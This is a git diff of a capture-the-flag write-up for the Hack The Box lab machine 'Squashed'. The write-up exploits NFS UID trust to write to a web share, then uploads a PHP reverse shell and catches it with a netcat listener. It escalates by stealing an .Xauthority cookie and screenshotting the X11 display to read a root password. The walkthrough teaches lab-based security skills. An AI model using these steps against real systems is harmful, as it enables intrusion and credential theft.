@@ -15,7 +15,7 @@ To start this box, let's run a Nmap scan. The Nmap scan reveals the ports for SS
 
 _Note: I added the machine's IP to my /etc/hosts file._
 
-```
+```sh-session
 nmap -sC -sV squashed.htb -oN top_1000                                     
 
 PORT     STATE SERVICE VERSION
@@ -60,7 +60,7 @@ Network File System (NFS) is a server that allows for the transfer of files betw
 ### Enumerating NFS
 We can view the file shares by using the `showmount` command.
 
-```
+```sh-session
 showmount -e squashed.htb
 
 Export list for squashed.htb:
@@ -81,8 +81,9 @@ sudo mount -t nfs squashed.htb:/home/ross /mnt/ross
 Let's start by investigating the webshare.
 
 ### Investigating The Webshare
+Investigating the webshare shows that we do not have access to the share's contents. 
 
-```
+```sh-session
 ls -la /mnt/webshare                                                        
 
 ls: cannot access '/mnt/webshare/.': Permission denied
@@ -101,16 +102,18 @@ d????????? ? ? ? ?            ? ..
 ?????????? ? ? ? ?            ? index.html
 ?????????? ? ? ? ?            ? js
 ```
+However, we can make note of the owner's UID and membership to the `www-data` group. This information will be useful soon.
 
-```
+```sh-session
 ls -ld /mnt/webshare/                                                        
 
 drwxr-xr-- 5 2017 www-data 4096 Mar 14 09:45 /mnt/webshare/
 ```
 
 ### Investigating Ross' Share
+Let's repeat the same process with Ross' share. Unlike the webshare, we have read access to Ross' home directory. Once again, make note of the owner's UID. It's time to exploit NFS. 
 
-```
+```sh-session
 ls -la /mnt/ross                                                             
 
 total 68
@@ -136,26 +139,26 @@ lrwxrwxrwx  1 root   root      9 Oct 21 09:07 .viminfo -> /dev/null
 ```
 
 # Exploiting NFS
-EXPLAIN THE VULNERABILITY
+We can exploit NFS because it does not keep track of machines only UIDs. Therefore, we can create dummy accounts on our host machine with UIDs that correspond to the owners of the shares and gain privileged access to them. 
 
-create dummy account. Mine is called `webshare-squasher` but you can choose a better name for yours :wink:.
+Let's create our dummy account. Mine is called `webshare-squasher` but you can choose a better name for yours :wink:.
 
-```
+```sh-session
 sudo useradd -m webshare-squasher
 ```
-mimic the UID of 2017
+Let's give our user the proper UID and GID of 2017.
 
-```
+```sh-session
 sudo usermod -u 2017 webshare-squasher && sudo groupmod -g 2017 webshare-squasher
 ```
-switch users
+We can then switch to our dummy user,
 
-```
+```sh-session
 sudo su webshare-squasher
 ```
 
-see if we have access
-```
+and see if we have access to the share -- we do! 
+```sh-session
 ls -la /mnt/webshare
 
 total 56
@@ -168,50 +171,66 @@ drwxr-xr-x 2 webshare-squasher www-data  4096 Mar 14 10:00 images
 drwxr-xr-x 2 webshare-squasher www-data  4096 Mar 14 10:00 js
 ```
 
-we do! let's upload a php reverse shell. I'm using this one LINK TO PENTESTMONKEY's shell
+Let's upload a php reverse shell and get user. I like using [revshells.com](revshells.com) to generate shells, but you can use your favorite tool. :smile:
 
-access the file from the site
+Copy the shell to the webshare, spin up a netcat listener, and access the file using curl!
+
+_Step 1: Netcat listener._
+```sh-session
+nc -lvnp <YOUR_PORT>
 ```
+_Step 2: Request the file._
+```sh-session
 curl http://squashed.htb/shell.php
 ```
-
+Soon after that, we have a shell!
 ![Webshell]({{site.baseurl}}/assets/img/squashed/shell.png)
 
 # Path To Root
-```
+To gain root access, we have to exploit X11. Looking back on Ross's share, we see `.Xauthority` and `.xsession`. These indicate that a X11 display might be configured. 
+`.Xauthority` is used to store credentials, but its bytes can be quite weird so we should base64 encode them to interact with them. 
+
+```sh-session
 cat /mnt/ross/.Xauthority | base64 
-AQAADHNxdWFzaGVkLmh0YgABMAASTUlULU1BR0lDLUNPT0tJRS0xABDrUznPv+BDu3LVehkVgiZX
-
 ```
-GET COMMANDS FOR THIS PART
-
+Paste the cookie onto the target machine, decode it, and place it in the `/tmp` directory.
+```sh-session
+echo "AQAADHNxdW<SNIP>" | base64 -d > /tmp/.Xauthority
 ```
+Then set the cookie by using the `XAUTHORITY` environment variable.
+```
+export XAUTHORITY=/tmp/.Xauthority
+```
+
+Now we can interact with the X11 display using Ross' session. Our goal is to see what's happening on the display. Before we can do that, we have to know where our display is located. We can figure that out by using the `w` command. As seen below, we can use the `:0` display. 
+```sh-session
 w
 
  14:10:18 up 40 min,  1 user,  load average: 0.00, 0.00, 0.00
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 ross     tty7     :0               13:30   40:07   4.86s  0.04s /usr/libexec/gnome-session-binary --systemd --session=gnome
 ```
+We can now use the `xwd` command to take a screenshot and place the result in the `/tmp` directory. 
 
-```
-xwd -root -screen -silent -display :0 > /tmp/screen.xwd
+```sh-session
+xwd -root -screen -display :0 > /tmp/screen.xwd
 ```
 
-set up a python server in the directory you placed the screenshot and then retrieve it on your host machine.
-```
+To retrieve the screenshot, set up a python server in the `/tmp` directory and then retrieve it on your host machine by using curl.
+```sh-session
 curl http://squashed.htb:8000/screenshot.xwd
 ```
 
-Convert the image using the `convert` commandline utility.
+Convert the image using the `convert` commandline utility, and then open it!
 
-```
+```sh-session
 convert screenshot.xwd screenshot.png
 ```
 
-it's a screenshot of a password manager! 
+Luckily for us, it's a screenshot of a password manager with the root password!
 
 ![Password Manager]({{site.baseurl}}/assets/img/squashed/pwd-manager.png)
 
-Go back to your shell as alex. Use the `su` command and type in the root password to gain full access to the machine!
+Go back to your shell as alex. Use the `su` command and type in the root password to gain administrative access to the machine!
 
-I hope you enjoyed this writeup! Happy Hacking :)
+I hope you enjoyed this writeup! Happy hacking :)
